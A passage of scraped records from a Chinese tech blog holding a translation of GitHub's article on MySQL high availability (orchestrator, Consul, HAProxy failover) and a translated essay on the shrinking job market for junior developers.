hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">v7</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/2976e1383dc6fd216901213fcff13ae4.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            微博：@_v7__        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/vincent7\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/vincent7/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/2135822193\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：vince_yang\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,API,Feed,架构设计", "url": "http://blog.jobbole.com/114156/", "url_obj_id": "7b4b289d21745010a22e3afbfc59d82c"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "title": "GitHub 的 MySQL 高可用性实践分享", "create_date": "2018/07/09 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://githubengineering.com/mysql-high-availability-at-github/\">shlomi-noach </a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-high-availability-at-github?print\">oschina</a>   </div><div>\n<p>GitHub 使用 MySQL 作为所有非 git 仓库数据的主要存储, 它的可用性对 GitHub 的访问操作至关重要。GitHub 站点本身、GitHub 的 API、身份验证等等都需要进行数据库访问。我们运行着多个 MySQL 集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置, 主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改, 并提供数据的读取服务。</p>\n<p>主节点的可用性尤为重要。没有主服务器, 集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。</p>\n<p>为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。</p>\n<p>在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。</p>\n<p>本文将介绍 GitHub 的 MySQL 高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。</p>\n<h2>高可用目标</h2>\n<p>本文描述的解决方案，迭代并改进了之前在 GitHub 实现的高可用(HA)解决方案。随着规模的扩大，MySQL 的高可用策略必须适应变化。我们希望为 GitHub 中的 MySQL 和其他服务，提供类似的高可用策略。</p>\n<p>在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：</p>\n<ul>\n<li>你能容忍多长的中断时间？</li>\n<li>崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？</li>\n<li>故障转移的可靠性如何？什么情况下可以失败？</li>\n<li>解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？</li>\n<li>解决方案是否允许一个完整的数据中心故障或者出现网络隔离？</li>\n<li>有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。</li>\n<li>你能允许数据丢失吗？在多大程度上？</li>\n</ul>\n<p>为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。</p>\n<h2>移除基于 VIP 和 DNS 的服务发现</h2>\n<p>在之前的迭代版本中，我们：</p>\n<ul>\n<li>使用 <a href=\"https://githubengineering.com/orchestrator-github/\" rel=\"nofollow\">orchestrator</a> 来做检测和故障转移</li>\n<li>使用 VIP 和 DNS 做主节点的发现</li>\n</ul>\n<p>在这个迭代版本中，客户端使用名字服务（比如 mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟 IP(VIP)，这个 VIP 指向主节点。</p>\n<p>因此，在正常情况下，客户端只需要解析名称，连接到解析后的 IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。</p>\n<p>考虑这个跨越三个不同数据中心的复制拓扑：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/e752113fd43657ff8cf09024a4f5d777.png\" alt=\"\"></p>\n<p>当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。</p>\n<p>orchestrator 将会检测到故障，选举出一个新的主节点，然后重新分配 name（名称）和 VIP（虚拟 IP）。客户端实际上并不知道主节点的真实身份：它们只知道 name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：</p>\n<p>VIP 是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放 VIP，服务器必须发送 ARP 请求。拥有 VIP 的服务器必须在新提升的主节点获得 VIP 之前先释放掉。这还有一些额外的影响：</p>\n<ul>\n<li>有秩序的故障转移操作会首先通知故障主节点并要求它释放 VIP，然后再通知新提升的主节点并要求它获取 VIP。如果无法通知到原主节点或者拒绝释放 VIP 怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。\n<ul>\n<li>我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个 VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。</li>\n<li>事实源于两个独立服务器间的协作，并且这个设置是不可靠的。</li>\n</ul>\n</li>\n<li>即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。</li>\n<li>即使 VIP 发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。</li>\n</ul>\n<p>VIP 受限于物理位置。它们属于交换机或者路由器。所以，我们只能将 VIP 重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配 VIP，只能修改 DNS。</p>\n<ul>\n<li>修改 DNS 需要较长的传播时间。根据配置，客户端会缓存 DNS 一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。</li>\n</ul>\n<p>仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：</p>\n<ul>\n<li>主节点通过 pt-heartbeat 心跳服务进行自行注入，目的是<a href=\"https://githubengineering.com/mitigating-replication-lag-and-reducing-read-load-with-freno/\" target=\"_blank\" rel=\"nofollow\">测量延迟和节流</a>。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。</li>\n<li>同样的，<a href=\"https://github.com/github/orchestrator/blob/master/docs/pseudo-gtid.md\" rel=\"nofollow\">Pseudo-GTID</a> 注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。</li>\n<li>新的主节点被设为可写。如果可能的话，原主节点被设为只读。</li>\n</ul>\n<p>这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。</p>\n<p>该解决方案生效了，GitHub 已经成功完成 MySQL 的故障迁移，但我们希望我们的 HA 在以下方面有所改进：</p>\n<ul>\n<li>数据中心不可知</li>\n<li>允许数据中心出现故障</li>\n<li>删除不可靠的协作工作流</li>\n<li>减少总的中断时间</li>\n<li>尽可能地进行无损故障转移</li>\n</ul>\n<h2>GitHub 的高可用解决方案：orchestrator, Consul, GLB</h2>\n<p>我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：</p>\n<ul>\n<li>使用 <a href=\"https://github.com/github/orchestrator\" target=\"_blank\" rel=\"nofollow\">orchestrator</a> 来做监测和故障转移。我们使用跨数据中心的 <a href=\"https://github.com/github/orchestrator/blob/master/docs/raft.md\" rel=\"nofollow\">orchestrator/raft</a> 方案，如下图。</li>\n<li>使用 Hashicorp 的 <a href=\"https://www.consul.io/\" rel=\"nofollow\">Consul</a> 来做服务发现。</li>\n<li>使用 <a href=\"https://githubengineering.com/introducing-glb/\" target=\"_blank\" rel=\"nofollow\">GLB/HAProxy</a> 作为客户端和写节点的代理层。</li>\n<li>使用选播(anycast)做网络路由。</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d28cf7c2b62e1601cd4f817cbf54740.png\" alt=\"\"></p>\n<p>新的设置将完全删除 VIP 和 DNS 的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。</p>\n<h3>正常流程</h3>\n<p>正常情况下，应用程序通过 GLB/HAProxy 连接到写节点。</p>\n<p>应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1 的主节点命名为 mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(<a href=\"https://en.wikipedia.org/wiki/Anycast\" target=\"_blank\" rel=\"nofollow\">anycast</a>) IP。</p>\n<p>使用选播时，名字在任何地方都被解析为相同的 IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有 GLB（我们的高可用负载均衡）被部署在不同的容器中。指向 mysql-writer-1.github.net 的流量总是路由到本地数据中心的 GLB 集群。因此，所有客户端都由本地代理提供服务。</p>\n<p>我们在 <a href=\"https://www.haproxy.com/\" rel=\"nofollow\">HAProxy</a> 上运行 GLB。我们的 HAProxy 维护了一个写连接池：每个 MySQL 集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC 中的所有 GLB/HAProxy 容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入 mysql-writer-1.github.net，它连接到哪个 GLB 服务器并不重要。它总会被路由到实际的 cluster1 主节点上。</p>\n<p>对于应用程序而言，服务发现结束于 GLB，并且不再需要重新发现。就这样，通过 GLB 将流量路由到正确地址。</p>\n<p>GLB 如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到 GBL 呢？</p>\n<h3><strong>Consul 的服务发现</strong></h3>\n<p>Consul 是著名的服务发现解决方案，它也提供 DNS 服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。</p>\n<p>在 Consul 的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主 FQDN，端口，IPV4，IPV6。</p>\n<p>每一个 GLB/HAProxy 节点都运行 consul 模板：每一个服务都在监听 consul 数据的变更（这里主要是对集群主控的数据变更）。consul 模板会生成一个有效的配置文件并且当配置变更时，能够自动重载 HAProxy。</p>\n<p>因此，Consul 中主控标识的变更会被每一个 GLB/HAProxy 观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。</p>\n<p>在 GitHub 中，每一个数据中心都有一个 Consul 设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。</p>\n<p>那么 Consul 是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？</p>\n<h3>orchestrator/raft</h3>\n<p>运行一个 orchestrator/raft 设置：orchestrator 节点之间通过 raft 一致性算法进行通信。每一个数据中心有 1~2 个 orchestrator 节点。</p>\n<p>orchestrator 负责失败检测，MySQL 故障转移，以及 Consul 主控的变更通知。故障转移通过单个 orchestrator/raft 主导节点进行操作，但是对于主控变更，产生新主控的消息会通过 raft 机制被传播到所有 orchestrator 节点。</p>\n<p>一旦 orchestrator 节点接收到主控变更的消息，它们会与自己对应的本地 Consul 设置通信：它们都执行 KV 写操作。具有多个 orchestrator 节点的数据中心会有多个完全相同的 Consul 写操作。</p>\n<h3>整体流程</h3>\n<p>在主节点故障的场景中：</p>\n<ul>\n<li>orchestrator 节点检测到故障。</li>\n<li>orchestrator/raft 主导节点开始恢复。一个新的主节点被设置为 promoted 状态。</li>\n<li>orchestrator/raft 向所有 raft 集群节点通知主节点变更。</li>\n<li>所有 orchestrator/raft 成员接收到主节点变更的通知。每个成员都向本地 Consul 写入包含新主节点身份的 KV 记录。</li>\n<li>每个 GLB/HAProxy 都运行一个 consul 模版，用于监视 Consul KV 存储的变化，并重新配置和重新加载 HAProxy。</li>\n<li>客户端流量被重定向到新的主节点上。</li>\n</ul>\n<p>每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator 不需要知道负载均衡。Consul 不需要知道这些信息是从哪里来的。代理只关心 Consul，客户端只关心代理。</p>\n<p>而且：</p>\n<ul>\n<li>没有 DNS 的变更需要传播。</li>\n<li>没有 TTL。</li>\n<li>整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。</li>\n</ul>\n<h3>其他细节</h3>\n<p>为了进一步确保流程的安全，我们还提供了以下内容：</p>\n<ul>\n<li>将 HAProxy 的配置项 hard-stop-after 设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。\n<ul>\n<li>通过使用 hard-stop-after 配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。</li>\n</ul>\n</li>\n<li>我们并不严格要求 Consul 随时可用。实际上，我们只需要它在故障转移期间可用。如果 Consul 恰好这时不可用，GLB 将继续使用已知的信息运作，不采用任何极端的行动。</li>\n<li>GLB 被用于验证新提升的主节点的身份。类似于我们的 <a href=\"https://githubengineering.com/context-aware-mysql-pools-via-haproxy/\" target=\"_blank\" rel=\"nofollow\">context-aware MySQL pools</a>（上下文感知的 MySQL 线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在 Consul 中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在 Consul 中错误的写入了一个非主节点的名称，没有问题；GLB 将拒绝更新它并以最后已知的状态继续运行。</li>\n</ul>\n<p>我们会在以下章节进一步完成备受关注和期望的高可用目标。</p>\n<h1>orchestrator/raft 失败检测</h1>\n<p>orchestrator使用<a href=\"https://github.com/github/orchestrator/blob/master/docs/failure-detection.md\" target=\"_blank\" rel=\"nofollow\">全面方法</a>来检测失败，因此这种方法非常可靠。我们不会观察到误报 —— 因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。</p>\n<p>通过完全的 DC 网络隔离（又称 DC 栅栏），orchestrator/raft 进一步处理这个问题。一个 DC 网络隔离会引起一些混淆：这个 DC 中的服务器是可以互相通信的。他们是与其他 DC 网络隔离，还是其他 DC 被网络隔离？</p>\n<p>在一个 orchestrator/raft 设置中，raft 的 leader 节点就是运行故障转移的那个节点。leader 是取得了大多数节点支持的节点（特定数量）。我们的 orchestrator 节点部署就是这样，没有单一数据中心可以占大多数，任何 n-1 的 DC 也是如此。</p>\n<p>在一个完全 DC 网络隔离的事件中，这个 DC 的 orchestrator 节点与其它 DC 中的对应节点失去连接。最终，隔离 DC 中的 orchestrator 节点不能作为 raft 集群的 leader 节点。如果任何这种节点碰巧成为了 leader 节点，它就会退出。一个新的 leader 节点可以从任何一个其他 DC 分配。leader 节点会得到其他所有 DC 的支持，这些 DC 彼此之间可以进行通信。</p>\n<p>因此，调用 shots 的 orchestrator 节点将位于网络隔离数据中心之外。一个隔离 DC 应该有一个主服务器，orchestrator 会使用可用 DC 中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离 DC 中的那些节点来做这个决定，以此来缓解 DC 隔离。</p>\n<h1>更快的公告</h1>\n<p>通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？</p>\n<p>当 orchestrator 开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。</p>\n<p>它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：</p>\n<ul>\n<li>没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且</li>\n<li>认为服务器可以将它所有的版本视为复本。</li>\n</ul>\n<p>在这个例子中 orchestrator 首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了 Consul KV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。</p>\n<p>有可能当我们的 GLB 服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！</p>\n<h2>半同步复制</h2>\n<p>在 MySQL 的<a href=\"https://dev.mysql.com/doc/refman/en/replication-semisync.html\" target=\"_blank\" rel=\"nofollow\">半同步复制</a>中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。</p>\n<p>一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。</p>\n<p>我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地 DC 副本，通常也发送到远程 DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。</p>\n<p>我们在本地 DC 副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的 DC 故障进行无损故障转移的代价很高昂，我们并不期待这么做。</p>\n<p>在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的<a href=\"https://githubengineering.com/mysql-testing-automation-at-github/\" target=\"_blank\" rel=\"nofollow\">试验</a>中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。</p>\n<h2>心跳注入</h2>\n<p>我们没有在已提升/已降级的主设备上管理 pt-heartbeat 服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些<a href=\"https://github.com/percona/percona-toolkit/pull/302/files?w=1\" rel=\"nofollow\">补丁</a>，以便使 pt-heartbeat 可以支持服务器端来回更改它们的 read_only 状态或其完全崩溃。</p>\n<p>在我们目前的设置中，在主服务器及其副本上运行 pt-heartbeat 服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的 pt-heartbeat 会将服务器标识为可写，并开始注入心跳事件。</p>\n<h2>orchestrator 所有权委托</h2>\n<p>我们进一步委托到 orchestrator：</p>\n<ul>\n<li>伪-GTID注入</li>\n<li>设置被提升的主控作为可写的，清除它的复写状态</li>\n<li>如果可能，设置老的主控为只读状态</li>\n</ul>\n<p>对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让 orchestrator 直接应用变更到被晋升的主控上也应该是合理的。</p>\n<h2>限制和缺点</h2>\n<p>代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。</p>\n<p>随着分布式系统的发展，我们仍然遗留了未处理的场景。</p>\n<p>值得注意的是，在数据中心隔离场景中，假设主服务器位于 DC 中，DC 中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的 DC 中，通过实现一个可靠的 <a href=\"https://en.wikipedia.org/wiki/STONITH\" target=\"_blank\" rel=\"nofollow\">STONITH</a> 来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。</p>\n<p>更多的场景存在：故障转移时 Consul 的终端；部分 DC 隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。</p>\n<h2>结果</h2>\n<p>orchestrator/GLB/Consul 设置给我们提供以下功能：</p>\n<ul>\n<li>可靠的故障检测</li>\n<li>数据中心不可知的故障迁移</li>\n<li>典型的无损故障迁移</li>\n<li>对数据中心网络隔离的支持</li>\n<li>缓解脑裂的问题（仍在实现中）</li>\n<li>无合作相关的依赖</li>\n<li>多数场景下大约 10~13 秒的断电恢复能力。（我们观察到一些场景下最长 20 秒的断电恢复和极端场景下最长 25 秒的情况）</li>\n</ul>\n<h2>结语</h2>\n<p>编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114200votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,MySQL,高可用", "url": "http://blog.jobbole.com/114200/", "url_obj_id": "b88c57937f3bff3e9546fbbb3ad0988e"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/03/1fd843979d2a6757332bedd49c9c8d80.png"], "title": "是什么让初级工程师走投无路？", "create_date": "2018/05/24 ·", "praise_num": 1, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q3198108035\">tsteho</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/@melissamcewen/who-killed-the-junior-developer-33e9da2dc58c\">Melissa Mcewen</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><em>虽然有非常多的初级工程师，但是并没有非常多的职位给他们。</em></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/1fd843979d2a6757332bedd49c9c8d80.png\" alt=\"\"></p>\n<p>几个月前，我参加了一场针对技术领域女性的活动。很多参加者中是新的开发者，毕业于编程学校或者计算机科学课程。几乎所有人都告诉我，她们在获得第一份工作时遇到了麻烦。</p>\n<p>我很幸运。我在大学的第一份“真正”工作是 2010 年哥伦比亚大学的“初级应用程序开发人员”。现如今，甚至找不到一个招聘初级开发者岗位的招聘帖。发这些招聘帖的人说他们被淹没在了简历中。然而优秀的公司又抱怨找不到好的工程师。</p>\n<p>我想知道这是为什么？</p>\n<p>我不知道这样做，具体来说能够为我们节省多少成本，毕竟我不参与公司的运营。但是我知道很多公司对我说过：「我们不雇佣初级工程师的原因是，<strong>让高级工程师花时间给他们提供指导，对我们来说成本太高了</strong>。」我已经了解高级工程师的价格，因为我就是其中之一，并且为了预估项目预算，项目经理曾让我给项目分配时间。我知道的价格区间是 190 ~ 300 美元每小时。这就是很多公司认为雇佣初级工程师是一笔损失的原因。</p>\n<p>我并不这么认为：没有高级工程师能够一直高效工作一整天。公司对人力成本的焦虑就像鳄鱼的眼泪，（至少以我的观点来说）他们刻意不去思考浪费在很多事物上的时间，比如开会。</p>\n<p>但让我们来做个假设，他们将初级开发者的职位重新加入到团队。另一个问题出现了：<strong>高级工程师根本没有与初级工程师合作或者培训他人的经验</strong>。当我第一次开始与初级工程师合作时，我不知道该如何去做。我感到迷茫和困惑。我所待的公司基本上就是这样的态度：“让他们有事可做，让他们可以从中学到东西。”但是，这样做真的不可持续。</p>\n<p>我寻找资源，但是并没有找到。如果你知道任何资源，请在留言中通知我。我最终拼凑了各种课程和不同作业。</p>\n<p>但令人惊叹的是，我在做这件事时学到了很多东西。直到我必须解释 Javascript 语言的特性，我才觉得我真的深入地理解了它们。我为教学开发的一些工具最终付诸于项目。</p>\n<p>现在，有一些时候令我感到沮丧。特别是当项目经理或其他经理不了解现实状况的时候。他们总觉得，这些人教了就马上能够进行开发，但这之间有个消化和理解的过程。</p>\n<p>我认为我想说的是：整个软件开发生态系统需要初级工程师以保持健康。培训他们有成本，但也有好处。</p>\n<p>我建议那些想要再次招聘初级工程师的公司，投入一些时间用来制定一个大纲，用来帮助高级工程师以及任何与他们合作的人员有效地辅导。并且说明下这个严峻的现实。</p>\n<p>就像<strong>并不是所有初级工程师能够成为成功的开发者</strong>。那样的话，你会做什么呢？抱怨辅导你的高级工程师？或者追逐那些奋斗于通往成功领域（如项目管理、销售工程师或者其他非开发的角色）的人。在这些领域，软件技能也是非常重要的。</p>\n<p>并且<strong>并不是所有的高级工程师能够成为成功的导师</strong>。很多杰出的工程师不具备这一特质。他们应该避免扮演这样的角色。对于那些必须担任导师这一角色的人，如果他们没做好，我们也不应该苛责他们。我曾在一个团队中给初级开发者提供大部分的指导。与其他工程师所做的工作相比，这被认为不是“真正”的工作，这后来也让我不太愿意担当这个角色。是的，我会将性别考虑进去，因为我是一位女性，并且当女性担任类似这种角色，受刻板印象的影响，她们总被认为是“训导员”。那意味着更低的声誉，更低的声誉意味着更少的工资。</p>\n<p>话虽这么说，但如果没有提及一些其他阻碍初级工程师的经济问题，我不足以写下这篇文章。最近，因为一个活动，我拜访了一家公司，他们大概的意思就是说，现在所有“容易”的工作都已外包给另一个国家。这些工作以前都是初级工程师做的。之后有了自动化。我还是初级工程师时许多需要亲自做的工作，现在都可以自动化处理了。</p>\n<p>对于那些初级工程师，找到你的第一份工作正变得越来越困难。你可能不得不做一些我不愿意推荐的事，比如免费给各种项目打工。<strong>如果你确实选择了一个非常好的开源项目，你可以将它写到简历上</strong>。我<strong>不太倾向于推荐为“创业公司”免费打工</strong>。</p>\n<p>你也要寻找你自己的导师。现场见面会是最好的方式，虽然我明白并不是每个人都喜欢这样，因此你可以试试 Slack 和 Discord 聊天应用。不过就像很多约会一样，这也会变得糟糕。你将被多次的拒绝。你将做一些糟糕的、甚至完全失败的项目，因为和商业项目的人员相比，免费项目的工作人员一般有点更古里古怪。就像一个初级工程师告诉我的：他们不再去某个见面会，因为他们之前做的项目彻底地失败了。我不得不告诉他们应该继续寻找项目，但心中要明白大多数项目都不是完善的。</p>\n<p>对我而言，我很高兴为参加见面会的人提供辅导。在这些背景下，我也要努力地制定一份更正式的导师计划。</p>\n<p>我不确定整个行业的解决方案是什么。我不确定缺乏初级工程师的公司是不平衡的还是聪明的。实际情况是，大多数软件开发人员不会长时间呆在一个地方，所以也许投入大量资源来培训人员是没有意义的。或者说，这个行业也许应该问问自己，为什么人们不停地跳槽？也许是因为大多数公司都很糟糕，或者对我们很多人来说，这是提高薪水的唯一途径。我可以等待一个愚蠢的、毫无意义的年度“绩效评估”让我涨 1％ 的工资。或者投递简历，通过面试，拿到 10％ 或更多的工资涨幅。</p>\n<p><strong>这不仅仅是个别公司不够完善的信号，也是整个行业不够完善的信号。</strong></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113954\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113954votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113954\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div 